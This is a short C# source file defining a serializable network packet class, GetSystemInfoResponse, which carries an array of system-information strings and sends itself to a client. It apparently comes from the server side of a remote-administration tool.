using System;
using xServer.KuuhakuCekirdek.Ağ;

namespace xServer.KuuhakuCekirdek.Paketler.ClientPaketleri
{
    [Serializable]
    public class GetSystemInfoResponse : IPacket
    {
        public string[] SystemInfos { get; set; }

        public GetSystemInfoResponse()
        {
        }

        public GetSystemInfoResponse(string[] systeminfos)
        {
            this.SystemInfos = systeminfos;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}